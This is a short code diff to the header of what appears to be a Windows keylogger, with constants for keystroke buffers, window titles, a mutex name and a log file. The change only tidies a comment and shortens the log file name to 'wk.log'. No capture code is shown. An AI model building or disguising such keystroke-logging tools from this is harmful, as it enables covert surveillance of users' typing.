@@ -8,11 +8,11 @@
 # include <iomanip>			// For std::setw and std::setfill
 # include <thread>			// For sleep_for
 
-#include <locale>// For wide characters
+#include <locale>			// For wide characters
 #include <codecvt>
 
 # define TW_MUTEX_NAME		"TYYghhTYU5678FuGHFGFHYFUIY67"
-# define TW_LOGFILE			"winkey.log"
+# define TW_LOGFILE			"wk.log"
 # define TW_MAX_SAME_VK		10	// Max amount of repetitive vkCode
 # define TW_WINTITLE_MAX	256
 # define TW_KEYSTROKE_MAX	64
